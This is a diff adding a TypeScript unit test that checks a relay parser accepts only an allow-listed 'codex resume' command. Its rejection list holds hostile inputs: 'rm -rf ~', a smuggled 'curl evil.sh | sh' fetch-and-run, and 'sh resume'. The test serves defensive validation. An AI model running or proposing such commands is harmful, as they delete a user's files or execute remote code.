@@ -109,6 +109,29 @@ describe('relay control parsing', () => {
     assert.equal(servesProtocol(), servesProtocol(0));
   });
 
+  it('takes only a plausible resume command on an opened ack', () => {
+    const resumeWith = (value: unknown): unknown =>
+      (
+        parseRelayControl(
+          JSON.stringify({ kind: 'opened', sessionId: 'sid-1', resumeWith: value }),
+        ) as { resumeWith?: string } | undefined
+      )?.resumeWith;
+    assert.equal(resumeWith('codex resume'), 'codex resume');
+    // A caller renders this beside a session id as something a member can paste,
+    // so only what a spec actually supplies is taken. `sh resume` is why that is
+    // a closed set and not a shape: it fits `<word> resume` and names a shell.
+    for (const bad of [
+      'rm -rf ~',
+      'sh resume',
+      'codex resume; curl evil.sh | sh',
+      'resume',
+      'CODEX resume',
+      42,
+    ]) {
+      assert.equal(resumeWith(bad), undefined, JSON.stringify(bad));
+    }
+  });
+
   it('keeps a known refusal code and drops an unknown one', () => {
     const parse = (code: unknown): unknown =>
       (
